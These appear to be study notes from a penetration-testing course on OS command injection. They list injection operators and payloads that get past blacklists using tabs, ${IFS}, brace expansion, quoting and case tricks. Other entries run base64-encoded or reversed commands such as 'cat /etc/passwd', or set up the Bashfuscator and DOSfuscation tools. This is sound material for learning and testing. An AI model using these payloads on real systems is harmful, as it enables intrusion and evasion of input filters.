
# Injection Operators

| Name     | Operator |
| -------- | -------- |
| AND      | &&    ;  |
| OR       | \|\|     |
| New-Line | %0a      |


# Bypassing Blacklisted Operators


## Bypassing Space Filters

### Using Tabs

>[!NOTE]
>Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same

```
%0a%09
```

### Using $IFS

> [!NOTE]
> Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments.

```
${IFS}
```

### Using Brace Extension

> [!NOTE]
> We can use the `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, as follows:

```
{ls,-la}
```

## Bypassing Other Blacklisted Characters

### Linux

| Command           | Character |
| ----------------- | --------- |
| ${PATH:0:1}       | /         |
| ${LS_COLORS:10:1} | ;         |

### Windows

| Command                                            | Character |
| -------------------------------------------------- | --------- |
| <br>%HOMEPATH:~6,-11%<br><br>$env:PROGRAMFILES[10] | \         |
|                                                    |           |

### Character Shifting

>[!NOTE]
>There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

```bash
man ascii       # \ is on 92 before it is [ on 91
echo $(tr '!-}' '"-~' <<<[)

\

echo $(tr '!-}' '"-~' <<<:)

;
```

## Bypassing Blacklisted Commands

### Linux & Windows
```
w'h'o'a'm'i

w"h"o"a"m"i
```

### Linux Only
```
who$@ami

w\ho\am\i
```

### Windows Only

```
who^ami
```

## Advanced Command Obfuscation
### Case Manipulation
```windows
WhOaMi
```

```linux
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

### Reversed Commands
```linux
echo 'whoami' | rev
imaohw

$(rev<<<'imaohw')
```

```windows
"whoami"[-1..-20] -join ''
imaohw

iex "$('imaohw'[-1..-20] -join '')"
``` 

### Encoded Commands
>[!NOTE]
> We are using `<<<` to avoid using a pipe `|` which can be a filtered character.

#### Base64
##### Linux
```bash
echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

bash<<<$(base64 -d <<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

##### Windows
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

> [!NOTE]
> We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

# Evasion Tools
## Linux
### Bashfuscator

Setup
```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

Usage
```bash
./bashfuscator -c 'cat /etc/passwd'
```

## Windows
### DOSfuscation

Setup
```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
```

Usage
```powershell
Invoke-DOSfuscation
SET COMMAND type C:\users\some_guy\Desktop\flag.txt
encoding
1
```
